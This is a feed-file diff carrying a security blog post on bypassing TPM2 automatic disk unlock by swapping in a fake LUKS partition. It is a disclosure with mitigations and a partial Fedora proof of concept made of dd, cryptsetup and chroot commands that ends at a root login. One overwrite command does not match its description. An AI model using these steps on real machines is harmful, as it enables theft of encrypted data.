@@ -8,9 +8,9 @@
         </description>
         <link>https://news.ycombinator.com</link>
         <generator>RSS for Node</generator>
-        <lastBuildDate>Fri, 17 Jan 2025 04:22:58 GMT</lastBuildDate>
+        <lastBuildDate>Fri, 17 Jan 2025 08:23:10 GMT</lastBuildDate>
         <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-50.xml" rel="self" type="application/rss+xml"></atom:link>
-        <pubDate>Fri, 17 Jan 2025 04:22:58 GMT</pubDate>
+        <pubDate>Fri, 17 Jan 2025 08:23:10 GMT</pubDate>
         <language>
 <![CDATA[en-US]]>
         </language>
@@ -20,11 +20,713 @@
         <ttl>240</ttl>
         <item>
             <title>
+<![CDATA[Bypassing disk encryption on systems with automatic TPM2 unlock]]>
+            </title>
+            <description>
+<![CDATA[
+Score 89 | Comments 32 (<a href="https://news.ycombinator.com/item?id=42733640">thread link</a>) | @arjvik
+<br/>
+January 16, 2025 | https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/ | <a href="https://web.archive.org/web/*/https://oddlama.org/blog/bypassing-disk-encryption-with-tpm2-unlock/">archive.org</a>
+<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Have you setup automatic disk unlocking with TPM2 and
+<code>systemd-cryptenroll</code> or <code>clevis</code>? Then
+chances are high that your disk can be decrypted by an attacker who
+just has brief physical access to your machine - with some
+preparation, 10 minutes will suffice. In this article we will
+explore how TPM2 based disk decryption works, and understand why
+many setups are vulnerable to a kind of filesystem confusion
+attack. We will follow along by exploiting two different real
+systems (Fedora + clevis, NixOS + systemd-cryptenroll).</p><pre data-lang="bash"><code data-lang="bash"><span># Examples commands used to enroll a key into the TPM. Whether your system is
+</span><span># suffers from this issue does not depend on which PCRs you choose here.
+</span><span>systemd-cryptenroll --tpm2-pcrs</span><span>=</span><span>0+2+7</span><span> --tpm2-device</span><span>=</span><span>auto </span><span>&lt;</span><span>device</span><span>&gt;
+</span><span>clevis</span><span> luks bind</span><span> -d </span><span>&lt;</span><span>device</span><span>&gt;</span><span> tpm2 </span><span>'{"pcr_bank":"sha256","pcr_ids":"0,1,2,7"}'
+</span></code></pre><p><strong>TL;DR:</strong> Most TPM2 unlock setups fail to verify
+the LUKS identity of the decrypted partition. Since the initrd must
+reside in an unencrypted boot partition, an attacker can inspect it
+to learn how it decrypts the disk and also what type of filesystem
+it expects to find inside. By recreating the LUKS partition with a
+known key, we can confuse the initrd into executing a malicious
+<code>init</code> executable. Since the TPM state will not be
+altered in any way by this fake partition, the original LUKS key
+can be unsealed from the TPM. Afterwards, the initial disk state
+can be fully restored and then decrypted using the obtained
+key.</p><p>You are safe if you additionally use a pin to unlock your TPM,
+or use an initrd that properly asserts the LUKS identity (which
+would involve manual work, so you'd probably know if that is the
+case).</p><h2 id="the-idea-behind-tpm2-based-disk-decryption"><span><span><a href="#the-idea-behind-tpm2-based-disk-decryption" aria-label="Anchor link for: the-idea-behind-tpm2-based-disk-decryption">🔗</a></span>
+The idea behind TPM2 based disk decryption</span></h2><p>The idea behind secure and password-less disk decryption is that
+the TPM2 can store an additional LUKS key which your system can
+only retrieve, if the TPM is in a predetermined, known-good state.
+This state is recorded in the so-called Platform Configuration
+Registers (PCRs), of which there are 24 in a standard compliant
+TPM. Their intended use is described in the <a href="https://uapi-group.org/specifications/specs/linux_tpm_pcr_registry/">Linux TPM PCR Registry</a> but also neatly summarized as a table in
+the <a href="https://www.freedesktop.org/software/systemd/man/latest/systemd-cryptenroll.html"><code>systemd-cryptenroll(1)</code></a> man page.</p><p>These registers store hashes which are successively updated
+while booting based on information like the bootlaoder hash, the
+firmware in use, the booted kernel, initrd image and a lot more
+things. By establishing a chain of trust through all components
+involved in booting up to the linux userspace, we can ensure that
+altering any component will affect one or several PCRs. Storing
+data in the TPM requires you to select a list of PCRs and it will
+ensure that the data can only be retrieved again if all of these
+PCRs are in the same state as when enrolling the secret.</p><p>Several of these registers have an agreed-upon purpose and are
+updated with some specific information about your system, such as
+your board's firmware, your BIOS configuration, OptionROMs (extra
+firmware loaded from external devices such as PCIe devices after
+POST), the secure boot policy, or other things. Here's an excerpt
+from the man page from above containing some of the registers that
+are important to us:</p><table><thead><tr><th>PCR</th><th>Name</th><th>Explanation</th></tr></thead><tbody><tr><td>0</td><td>platform-code</td><td>Core system firmware executable code; changes on firmware
+updates</td></tr><tr><td>2</td><td>external-code</td><td>Extended or pluggable executable code; includes option ROMs on
+pluggable hardware</td></tr><tr><td>7</td><td>secure-boot-policy</td><td>Secure Boot state; changes when UEFI SecureBoot mode is
+enabled/disabled, or firmware certificates (PK, KEK, db, dbx, …)
+changes.</td></tr><tr><td>15</td><td>system-identity</td><td>systemd-cryptsetup(8) optionally measures the volume key of
+activated LUKS volumes into this PCR. systemd-pcrmachine.service(8)
+measures the machine-id(5) into this PCR. systemd-pcrfs@.service(8)
+measures mount points, file system UUIDs, labels, partition UUIDs
+of the root and /var/ filesystems into this PCR.</td></tr></tbody></table><p>Below this list, an interesting piece of information is given in
+the man page about the intended use of PCRs for encrypted
+volumes:</p><blockquote><p>In general, encrypted volumes would be bound to some combination
+of PCRs 7, 11, and 14 (if shim/MOK is used). In order to allow
+firmware and OS version updates, it is typically not advisable to
+use PCRs such as 0 and 2, since the program code they cover should
+already be covered indirectly through the certificates measured
+into PCR 7. Validation through certificates hashes is typically
+preferable over validation through direct measurements as it is
+less brittle in context of OS/firmware updates: the measurements
+will change on every update, but signatures should remain
+unchanged. See the Linux TPM PCR Registry for more discussion.</p></blockquote><p>If you enroll your own secure boot keys and use a Unified Kernel
+Image (UKI), then using just PCR 7 will be sufficient to ensure
+integrity up to the point where we need to unlock our disk. Some
+distributions instead ship EFI executables that are pre-signed with
+the Microsoft keys, which allows them to enable secure boot by
+default without requiring the user to generate and enroll anything
+on their own. Since this also means that the user cannot sign their
+kernel and/or initrd image, a trusted and pre-signed shim is often
+used to measure the hash of the kernel and initrd before executing
+them into PCR 9, which we would want to use in that case. Another
+approach is to have the user generate a so-called Machine Owner Key
+(MOK) if they want to sign something, in which case PCR 14 should
+be used, too.</p><p>So the exact PCR selection may change a bit depending on the
+user's setup. A quick <a href="https://github.com/search?q=cryptenroll+%2F0%5C%2B2%5C%2B7%2F&amp;type=code">search on GitHub</a> or <a href="https://duckduckgo.com/?t=h_&amp;q=cryptenroll+0%2B2%2B7&amp;ia=web">on the internet</a> reveals that many people still opt to use
+additional PCRs like 0 and 2 in addition to 7, which is of course
+fine but may result in keys becoming inaccessible when the BIOS or
+some firmware is updated - which can be annoying.</p><h3 id="a-common-vulnerable-setup"><span><span><a href="#a-common-vulnerable-setup" aria-label="Anchor link for: a-common-vulnerable-setup">🔗</a></span>
+A common (vulnerable) setup</span></h3><p>If you already have secure boot set up, configuring TPM2 unlock
+for your LUKS partition is usually very simple. Most guides will
+resort to <code>systemd-cryptenroll</code> or <code>clevis</code>
+which are different implementations that internally do some
+variation of the following:</p><ol><li>Add a newly generated key to your LUKS partition</li><li>Seal this key in your TPM based on your selection of PCRs</li><li>Store the encrypted TPM context in the LUKS token metadata
+which is required to unseal the secret at a later point in
+time</li></ol><p>Both <code>clevis</code> and <code>systemd-cryptenroll</code>
+can store tokens in other ways than a TPM2, for example using a
+FIDO2 key. I found that <code>clevis</code> also supports
+retrieving tokens from network resources, but other than that the
+two tools are very similar in what they do.
+<code>systemd-cryptenroll</code> just comes pre-packaged with
+<code>systemd</code> so it is usually a bit simpler to use. Here is
+an example:</p><pre data-lang="bash"><code data-lang="bash"><span>systemd-cryptenroll --tpm2-pcrs</span><span>=</span><span>7</span><span> --tpm2-device</span><span>=</span><span>auto /dev/nvme0n1p3
+</span></code></pre><p>In theory, the disk is now properly protected, assuming the
+kernel command line cannot be edited, right? It can only be
+decrypted if PCR 7 is unchanged, and anything we would do to the
+bootloader, kernel or initrd would affect PCR 7.</p><p>Well, of course, I wouldn't be asking if there wasn't a tiny
+caveat: Assuming all disks were mounted properly, the initrd can be
+certain that no code has been modified up to this point. But it
+does <em>not</em> automatically ensure that the data on them is
+authentic. As the very last step, the initrd will execute the
+<code>init</code> executable of the real system, which usually
+doesn't undergo any kind of signature check before it is executed.
+And why would it have to - after all it is part of the encrypted
+root partition which cannot be altered by an attacker.</p><h3 id="the-exploit"><span><span><a href="#the-exploit" aria-label="Anchor link for: the-exploit">🔗</a></span> The exploit</span></h3><p>First of all, it is important to know that the initrd will fall
+back to a password prompt, if TPM unlocking fails for whatever
+reason. A BIOS update could always cause the secure boot database
+to be altered (thus invalidating PCR 7), or somebody makes a
+mistake when updating the system and forgets to sign the kernel and
+initrd properly. In such a case you don't want to be locked out
+from your system completely, so asking for the password is a sane
+thing to do.</p><p>But that also means if we replace the encrypted partition with a
+new LUKS partition (for which we choose the password), then the TPM
+decryption will fail and we will be asked for the password, which
+we control. After entering the password, the initrd will now think
+it has decrypted the partition correctly and proceed. If we manage
+to put the correct kind of filesystem inside of our fake LUKS
+partition so that the actual mounting succeeds, we can ship a
+malicious <code>init</code> binary that now has full access to the
+unlocked TPM, thus allowing us to decrypt the original filesystem,
+which we would have to backup before creating our malicious
+partition.</p><p>Now you might think the initrd can simply verify the filesystem
+UUID before mounting it since we cannot read it from the disk, but
+remember that anything the initrd knows is public knowledge, as the
+boot partition and initrd image are not encrypted. So we can just
+reuse the same LUKS UUID and filesystem UUID if necessary.</p><h3 id="securing-the-system"><span><span><a href="#securing-the-system" aria-label="Anchor link for: securing-the-system">🔗</a></span> Securing the system</span></h3><p>To solve this, we need to be able to authenticate all encrypted
+volumes before accessing any file on them. In <a href="https://0pointer.net/blog/brave-new-trusted-boot-world.html">this
+article</a> by Lennart Poettering from October 2022, where he
+describes the state of secure boot in systemd, he mentions how the
+process should look like to make the system secure. It is a bit
+involved so let me reiterate the important part.</p><p>After a disk has been unlocked, we want to derive a value from
+its volume key (the master key used to encrypt all its data) and
+use this value to extend PCR 15. This ensures that any fake volume
+would change this value since the original volume key cannot be
+known. Using <code>systemd-cryptsetup</code> instead of
+<code>cryptsetup</code> can already take care of this by adding
+<code>tpm2-measure-pcr=yes</code> to the crypttab file.</p><p>If we now ensure that the disk decryption order is
+deterministic, then we can compare the value in PCR 15 against a
+known and signed value in the initrd. If the wrong value is
+observed, the initrd can now abort the boot process before
+executing anything malicious.</p><h3 id="many-broken-guides"><span><span><a href="#many-broken-guides" aria-label="Anchor link for: many-broken-guides">🔗</a></span> Many broken guides</span></h3><p>There are loads of guides that describe in more detail how to
+setup TPM2 based disk unlocking, and while the concept is always
+the same, you will certainly find one adjusted to your favorite
+distribution. Here's a list of guides that I found online, sorted
+by date:</p><ul><li><a href="https://jnsgr.uk/2024/04/nixos-secure-boot-tpm-fde/">Secure Boot &amp;
+TPM-backed Full Disk Encryption on NixOS</a> (2024/04, NixOS,
+systemd-cryptenroll)</li><li><a href="https://forum.manjaro.org/t/howto-using-secure-boot-and-tpm2-to-unlock-luks-partition-on-boot/101626">[HowTo] Using Secure Boot and TPM2 to unlock LUKS partition on
+boot</a> (2024/01, Manjaro, systemd-cryptenroll)</li><li><a href="https://community.frame.work/t/guide-setup-tpm2-autodecrypt/39005">[GUIDE] Setup TPM2 Autodecrypt</a> (2023/10, Unspecified,
+systemd-cryptenroll, Misuse of PCR 15)</li><li><a href="https://blog.fernvenue.com/archives/debian-with-luks-and-tpm-auto-decryption/">Debian with LUKS and TPM auto decryption</a> (2023/09, Debian,
+systemd-cryptenroll)</li><li><a href="https://wiki.gentoo.org/wiki/Trusted_Platform_Module/LUKS">Gentoo
+Wiki - Trusted Platform Module/LUKS</a> (2023/05, Gentoo,
+clevis)</li><li><a href="https://221b.uk/safe-automatic-decryption-luks-partition-tpm2">Safe
+automatic decryption of LUKS partition using TPM2</a> (2023/01,
+Fedora, clevis, <a href="https://fedoramagazine.org/automatically-decrypt-your-disk-using-tpm2/">fedoramagazine</a>)</li><li><a href="https://blastrock.github.io/fde-tpm-sb.html">The
+ultimate guide to Full Disk Encryption with TPM and Secure Boot</a>
+(2022/04, Debian, tpm2-initramfs-tool)</li><li><a href="https://gist.github.com/jdoss/777e8b52c8d88eb87467935769c98a95">Decrypt
+LUKS volumes with a TPM on Fedora Linux</a> (2022/03, Fedora,
+systemd-cryptenroll)</li><li><a href="https://wiki.archlinux.org/title/User:Krin/Secure_Boot,_full_disk_encryption,_and_TPM2_unlocking_install">ArchWiki/User:Krin/Secure Boot, full disk encryption, and TPM2
+unlocking install</a> (2021/09, Arch Linux,
+systemd-cryptenroll)</li></ul><p>Unfortunately, I did not find any guide that addresses this, so
+most user setups are probably suffering from this issue. Though in
+all fairness, whether this is an issue to you obviously depends on
+your threat model. If you are using the TPM just to unlock your
+home server which nobody else has physical access to, then maybe
+this is a non-issue to you. But if you use this to protect the data
+on your laptop against theft, then chances are you want to set a
+TPM pin or implement PCR 15 verification as explained above.</p><p>Notably, I found that the ArchWiki entry of <a href="https://wiki.archlinux.org/title/Systemd-cryptenroll">systemd-cryptenroll</a>
+acknowledges this issue in a warning near the end of the
+article:</p><blockquote><p>Only binding to PCRs measured pre-boot (PCRs 0-7) opens a
+vulnerability from rogue operating systems. A rogue partition with
+metadata copied from the real root filesystem (such as partition
+UUID) can mimic the original partition. Then, initramfs will
+attempt to mount the rogue partition as the root filesystem
+(decryption failure will fall back to password entry), leaving
+pre-boot PCRs unchanged. The rogue root filesystem with files
+controlled by an attacker is still able to receive the decryption
+key for the real root partition. See Brave New Trusted Boot World
+and BitLocker documentation for additional information.</p></blockquote><p>And while this is correct, just using any of the PCRs 8-23
+doesn't automatically protect your data either. The initrd still
+has to ensure that the respective PCR is changed before executing
+the system's <code>init</code> binary, which is not done by
+default.</p><h2 id="proof-of-concept-exploitation-of-a-fedora-machine"><span><span><a href="#proof-of-concept-exploitation-of-a-fedora-machine" aria-label="Anchor link for: proof-of-concept-exploitation-of-a-fedora-machine">🔗</a></span> Proof-of-concept exploitation of a Fedora machine</span></h2><p>Now, let's have a look at a real system which we will setup in a
+similar way to how anyone else would have done it. I've picked one
+of the Fedora articles above, but you can expect this to work for
+all of the other distributions, too. In summary, my setup included
+the following steps:</p><ul><li>Install Fedora 41, I chose an encrypted root with ext4 on
+LUKS</li><li>Enable secure boot in the BIOS (and install the Microsoft keys
+since Fedora is signed with those keys)</li></ul><p>An interesting thing we notice right away is that the Fedora
+bootloader is signed using the Microsoft keys. We've already
+briefly talked about this in the beginning, this means it cannot
+sign the initrd at all. Instead, they have a signed shim that is
+executed after the bootloader which will calculate hashes of the
+kernel and initrd and extend PCR 9 with those values. Therefore, it
+is critical that we now include PCR 9 in our selection when
+enrolling the key to the TPM, otherwise the initrd could just be
+modified.</p><p>This approach has the advantage that the user doesn't have to
+deal with custom secure boot keys, but the downside is that every
+kernel or initrd update will affect the value in PCR 9, thus
+requiring us to re-enroll the key after rebooting on each system
+update. Here is a snapshot of my PCRs when I enrolled the key into
+the TPM. This is also the state that we need to reach later to
+succeed.</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> systemd-analyze pcrs
+</span><span>NR</span><span> NAME                SHA256
+</span><span> </span><span>0</span><span> platform-code       8c2af609e626cc1687f66ea6d0e1a3605a949319514a26e7e1a90d6a35646fa5
+</span><span> </span><span>1</span><span> platform-config     299b0462537a9505f6c63672b76a3502373c8934f08a921e1aa50d3adf4ba83d
+</span><span> </span><span>2</span><span> external-code       3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
+</span><span> </span><span>3</span><span> external-config     3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
+</span><span> </span><span>4</span><span> boot-loader-code    5fdbd66c267bd9513dbc569db0b389a37445e1aa463f9325ea921563e7fb37eb
+</span><span> </span><span>5</span><span> boot-loader-config  38a281376260137602e5c70f7a9057e4c55830d22a02bb5a66013d6ac2576d2f
+</span><span> </span><span>6</span><span> host-platform       3d458cfe55cc03ea1f443f1562beec8df51c75e14a9fcf9a7234a13f198e7969
+</span><span> </span><span>7</span><span> secure-boot-policy  4770a4fb1dac716feaddd77fec9a28bb2015e809a34add1a9d417eec36ec1e17
+</span><span> </span><span>8</span><span> -                   e3e23c0da36fa31767885aec7aee3180fb2f5e0b67569c3a82c2a1c3ca88a651
+</span><span> </span><span>9</span><span> kernel-initrd       091f6917b0c8788779f4d410046250e6747043a8cd1bd75bf90713cc6de30d99
+</span><span>10</span><span> ima                 2566bdf57c3aa880f7b0c480f479c0a88e0e72ae7ef3c1888035e7238bbe9257
+</span><span>11</span><span> kernel-boot         0000000000000000000000000000000000000000000000000000000000000000
+</span><span>12</span><span> kernel-config       0000000000000000000000000000000000000000000000000000000000000000
+</span><span>13</span><span> sysexts             0000000000000000000000000000000000000000000000000000000000000000
+</span><span>14</span><span> shim-policy         17cdefd9548f4383b67a37a901673bf3c8ded6f619d36c8007562de1d93c81cc
+</span><span>15</span><span> system-identity     0000000000000000000000000000000000000000000000000000000000000000
+</span><span>16</span><span> debug               0000000000000000000000000000000000000000000000000000000000000000
+</span><span>17</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>18</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>19</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>20</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>21</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>22</span><span> -                   ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+</span><span>23</span><span> application-support 0000000000000000000000000000000000000000000000000000000000000000
+</span></code></pre><h4 id="inspecting-the-system"><span><span><a href="#inspecting-the-system" aria-label="Anchor link for: inspecting-the-system">🔗</a></span> Inspecting the system</span></h4><p>Now, let's pretend we don't know anything about the system and
+that we just obtained physical access to the machine, which was
+powered-off.</p><p>We start by taking the main disk out and putting it into our
+machine. You may also be able to boot a Fedora or Debian live
+image, if the owner has not wiped the Microsoft keys from their
+BIOS in favor of their own. Once booted, we start investigating the
+disk layout and partitions:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> blkid
+</span><span>/dev/nvme0n1p1:</span><span> LABEL_FATBOOT=</span><span>"EFI"</span><span> LABEL=</span><span>"EFI"</span><span> UUID=</span><span>"E2AA-BB8B"</span><span> BLOCK_SIZE=</span><span>"512"</span><span> TYPE=</span><span>"vfat"</span><span> PARTLABEL=</span><span>"EFI System Partition"</span><span> PARTUUID=</span><span>"b9cd5e99-00ec-45e8-be33-72809ae30602"
+</span><span>/dev/nvme0n1p2:</span><span> LABEL=</span><span>"boot"</span><span> UUID=</span><span>"d0a1796a-5c1e-446f-8b70-2910d094d195"</span><span> BLOCK_SIZE=</span><span>"4096"</span><span> TYPE=</span><span>"ext4"</span><span> PARTUUID=</span><span>"e5cc6afa-285b-4bc6-8fb1-a6c5344d20a9"
+</span><span>/dev/nvme0n1p3:</span><span> UUID=</span><span>"779328d5-00ca-4ade-be44-6daa549642ed"</span><span> TYPE=</span><span>"crypto_LUKS"</span><span> PARTUUID=</span><span>"4e73c89f-3840-458a-ada6-0f5349ab36e1"
+</span></code></pre><p>We take a quick peek at the encrypted partition, which is our
+main target:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cryptsetup luksDump /dev/nvme0n1p3
+</span><span>LUKS</span><span> header information
+</span><span>Version:</span><span>        2
+</span><span>Epoch:</span><span>          9
+</span><span>Metadata</span><span> area:  16384 </span><span>[</span><span>bytes</span><span>]
+</span><span>Keyslots</span><span> area:  16744448 </span><span>[</span><span>bytes</span><span>]
+</span><span>UUID:</span><span>           779328d5-00ca-4ade-be44-6daa549642ed
+</span><span># [...]
+</span><span>Tokens:
+</span><span>  </span><span>0:</span><span> clevis
+</span><span>    </span><span>Keyslot:</span><span>    1
+</span><span># [...]
+</span></code></pre><p>We can already see that the system owner has used
+<code>clevis</code> to configure the automated unlocking. What we
+want to find for now is the initrd and kernel command line, so some
+GRUB or systemd-boot configuration file. Since Fedora uses
+pre-signed images, the EFI partition will only contain the loader
+and shim, which shouldn't contain any information about the actual
+system. But the boot partition <code>/dev/nvme0n1p2</code> looks
+promising, so let's mount it and see what we find:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> mount /dev/nvme0n1p2 /mnt/boot
+</span><span>[root@localhost]#</span><span> ls</span><span> -l</span><span> /mnt/boot
+</span><span>total</span><span> 222500
+</span><span>dr-xr-xr-x.</span><span>  6 root root      4096 Jan 13 23:09 ./
+</span><span>dr-xr-xr-x.</span><span> 19 root root      4096 Jan 13 23:06 ../
+</span><span>-rw-r--r--.</span><span>  1 root root    277997 Oct 20 02:00 config-6.11.4-301.fc41.x86_64
+</span><span>drwx------.</span><span>  3 root root      4096 Jan  1  1970 efi/
+</span><span>drwx------.</span><span>  3 root root      4096 Jan 13 23:10 grub2/
+</span><span>-rw-------.</span><span>  1 root root 139254374 Jan 13 23:09 initramfs-0-rescue-868c201e807541caacd6fa6b32d5ba2e.img
+</span><span>-rw-------.</span><span>  1 root root  45514433 Jan 14 00:54 initramfs-6.11.4-301.fc41.x86_64.img
+</span><span>drwxr-xr-x.</span><span>  3 root root      4096 Jan 13 23:06 loader/
+</span><span>drwx------.</span><span>  2 root root     16384 Jan 13 23:05 lost+found/
+</span><span>-rw-r--r--.</span><span>  1 root root    182584 Jan 13 23:09 symvers-6.11.4-301.fc41.x86_64.xz
+</span><span>-rw-r--r--.</span><span>  1 root root   9968458 Oct 20 02:00 System.map-6.11.4-301.fc41.x86_64
+</span><span>-rwxr-xr-x.</span><span>  1 root root  16296296 Jan 13 23:08 vmlinuz-0-rescue-868c201e807541caacd6fa6b32d5ba2e</span><span>*
+</span><span>-rwxr-xr-x.</span><span>  1 root root  16296296 Oct 20 02:00 vmlinuz-6.11.4-301.fc41.x86_64</span><span>*
+</span><span>-rw-r--r--.</span><span>  1 root root       161 Oct 20 02:00 .vmlinuz-6.11.4-301.fc41.x86_64.hmac
+</span></code></pre><p>Great! There are the kernel and initrd images plus a
+<code>loader/</code> directory containing some GRUB entry
+configurations. We will take a look at those configuration files
+first:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> ls</span><span> -l</span><span> /mnt/boot/loader/entries
+</span><span>-rw-r--r--.</span><span> 1 root root  445 Jan 13 23:10 868c201e807541caacd6fa6b32d5ba2e-0-rescue.conf
+</span><span>-rw-r--r--.</span><span> 1 root root  369 Jan 13 23:10 868c201e807541caacd6fa6b32d5ba2e-6.11.4-301.fc41.x86_64.conf
+</span><span>[root@localhost]#</span><span> cat /boot/loader/entries/868c201e807541caacd6fa6b32d5ba2e-6.11.4-301.fc41.x86_64.conf
+</span><span>title</span><span> Fedora Linux (6.11.4-301.fc41.x86_64) </span><span>41</span><span> (Server Edition)
+</span><span>version</span><span> 6.11.4-301.fc41.x86_64
+</span><span>linux</span><span> /vmlinuz-6.11.4-301.fc41.x86_64
+</span><span>initrd</span><span> /initramfs-6.11.4-301.fc41.x86_64.img
+</span><span>options</span><span> root=UUID=1a887df4-286d-4842-bd66-d8993e8596d2 ro rd.luks.uuid=luks-779328d5-00ca-4ade-be44-6daa549642ed rhgb quiet
+</span><span>grub_users </span><span>$</span><span>grub_users
+</span><span>grub_arg --unrestricted
+</span><span>grub_class</span><span> fedora
+</span></code></pre><p>Wow, this is looks like we already found all the important
+information! Judging from the commandline syntax, this is likely an
+initrd that was generated by dracut. There seems to be a LUKS
+encrypted partition with UUID
+<code>779328d5-00ca-4ade-be44-6daa549642ed</code> and a root file
+system with UUID <code>1a887df4-286d-4842-bd66-d8993e8596d2</code>,
+which is certainly inside of the LUKS partition. The type of
+filesystem is not specified, so we are free to choose anything that
+is supported by the initramfs for our fake.</p><h4 id="planning-our-exploit"><span><span><a href="#planning-our-exploit" aria-label="Anchor link for: planning-our-exploit">🔗</a></span> Planning our exploit</span></h4><p>In theory, we'd need to find out one additional thing - the
+binary that will be called by the initrd when it want's to switch
+to the real system. But the chances are very high that it is
+<code>/sbin/init</code> (this is not the case on all systems
+though, see the NixOS PoC below for an example). If our assumption
+doesn't work out, we can still double check by extracting the
+initrd later.</p><p>In order to confuse the initrd, we now need to:</p><ol><li>Backup the original LUKS parition so we can later decrypt
+it</li><li>Replace the LUKS partition with a fake LUKS partition that has
+the UUID <code>779328d5-00ca-4ade-be44-6daa549642ed</code></li><li>This LUKS partition must contain a filesystem with UUID
+<code>1a887df4-286d-4842-bd66-d8993e8596d2</code></li><li>The inner filesystem contains a <code>/sbin/init</code> binary
+that does what we want</li></ol><p>We may actually only backup the first few megabytes of the
+original LUKS partition and make sure our fake partition is exactly
+the same size as our backup. By overwriting just the beginning in
+this way we don't have to do a full disk backup, which would
+otherwise take a very long time and would require us to bring a
+spare disk with us.</p><h4 id="backup-the-beginning-of-the-original-luks-partition"><span><span><a href="#backup-the-beginning-of-the-original-luks-partition" aria-label="Anchor link for: backup-the-beginning-of-the-original-luks-partition">🔗</a></span> Backup the beginning of the original LUKS partition</span></h4><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> dd if=/dev/nvme0n1p3 of=/boot/luks-original.bak bs=64M count=1
+</span></code></pre><p>We'll abuse the free space on the boot partition to store this
+backup, which makes it easy to access later. If you don't want to
+tamper too much with the original disk, you can of course use a
+small thumb drive.</p><h4 id="create-fake-partition-and-filesystem-with-matching-uuids"><span><span><a href="#create-fake-partition-and-filesystem-with-matching-uuids" aria-label="Anchor link for: create-fake-partition-and-filesystem-with-matching-uuids">🔗</a></span> Create fake partition and filesystem with matching
+UUIDs</span></h4><p>Next, we create a <code>64MB</code> file in which we will
+prepare our partition. The size is a bit arbitrary, it just needs
+to cover the LUKS and inner filesystem header and must fit our
+exploit binary. So we initialize a new LUKS partition with the UUID
+from above, and then open it and format its contents with
+<code>ext4</code>:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> truncate</span><span> -s</span><span> 64MB /root/fakeluks
+</span><span>[root@localhost]#</span><span> cryptsetup luksFormat /root/fakeluks</span><span> --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 1234)</span><span> --uuid</span><span> 779328d5-00ca-4ade-be44-6daa549642ed
+</span><span>[root@localhost]#</span><span> cryptsetup open /root/fakeluks fakeluks</span><span> --key-file </span><span>&lt;</span><span>(</span><span>echo </span><span>-n</span><span> 1234)
+</span><span>[root@localhost]#</span><span> mkfs.ext4 /dev/mapper/fakeluks</span><span> -U</span><span> 1a887df4-286d-4842-bd66-d8993e8596d2
+</span><span>[root@localhost]#</span><span> mount /dev/mapper/fakeluks /mnt/root
+</span></code></pre><h4 id="prepare-filesystem"><span><span><a href="#prepare-filesystem" aria-label="Anchor link for: prepare-filesystem">🔗</a></span> Prepare filesystem</span></h4><p>Now we could theoretically prepare a tiny binary that directly
+extracts the key from the TPM, but it's far simpler just put a
+minimal Alpine image there and install the necessary tools to do
+that manually. This will also easily fit into <code>64MB</code>.
+Let's proceed by preparing the Alpine filesystem:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> cd /mnt/root
+</span><span>[root@localhost]#</span><span> wget https://dl-cdn.alpinelinux.org/alpine/v3.21/releases/x86_64/alpine-minirootfs-3.21.2-x86_64.tar.gz
+</span><span>[root@localhost]#</span><span> tar xvf alpine-minirootfs-3.21.2-x86_64.tar.gz
+</span><span>[root@localhost]#</span><span> rm alpine-minirootfs-3.21.2-x86_64.tar.gz
+</span><span>[root@localhost]#</span><span> cat /etc/resolv.conf </span><span>&gt;</span><span> /mnt/root/etc/resolv.conf      </span><span># Just for DNS resolution at this moment, so we can install packages in the chroot
+</span><span>[</span><span>root@localhost</span><span>]</span><span># chroot /mnt/root /sbin/apk add </span><span>\                      </span><span># Install some tools that we need
+</span><span>                    </span><span>tpm2-tools</span><span> tpm2-tss-tcti-device jose cryptsetup
+</span><span>[root@localhost]#</span><span> wget</span><span> -O</span><span> /mnt/root/bin/clevis-decrypt-tpm \
+</span><span>                    </span><span>"https://raw.githubusercontent.com/latchset/clevis/0839ee294a2cbb0c1ecf1749c9ca530ef9f59f8f/src/pins/tpm2/clevis-decrypt-tpm2"
+</span><span>[root@localhost]#</span><span> chmod +x /mnt/root/bin/clevis-decrypt-tpm             </span><span># Helper to retrieve password from TPM2
+</span><span>[root@localhost]#</span><span> sed</span><span> -i </span><span>'s/root:x/root:/'</span><span> /mnt/root/etc/passwd         </span><span># Remove root password
+</span></code></pre><h4 id="overwriting-the-partition"><span><span><a href="#overwriting-the-partition" aria-label="Anchor link for: overwriting-the-partition">🔗</a></span>
+Overwriting the partition</span></h4><p>Finally, we unmount our fake filesystem and overwrite the first
+<code>64MB</code> of the original partition with it, then put the
+disk back into the original machine and reboot:</p><pre data-lang="bash"><code data-lang="bash"><span>[root@localhost]#</span><span> umount /mnt/root
+</span><span>[root@localhost]#</span><span> cryptsetup close /dev/mapper/fakeluks
+</span><span>[root@localhost]#</span><span> sync
+</span><span>[root@localhost]#</span><span> dd if=/root/fakeluks of=/root/luks-original.bak bs=64M count=1
+</span></code></pre><p>We will now be asked for the LUKS password we just set, since
+the automatic decryption will obviously not trigger on our fake
+partition, which has no token metadata. After entering our password
+from above, we are greeted by the Alpine image. We can login as
+<code>root</code> without a password:</p><pre><code><span>Welcome to Alpine Linux 3.21
+</span><span>Kernel 6.11.4-301.fc41.x86_64 on an x86_64 (/dev/tty1)
+</span><span>
+</span><span>localhost login: root
+</span><span>Welcome to Alpine!
+</span><span>
+</span><span>localhost:~#
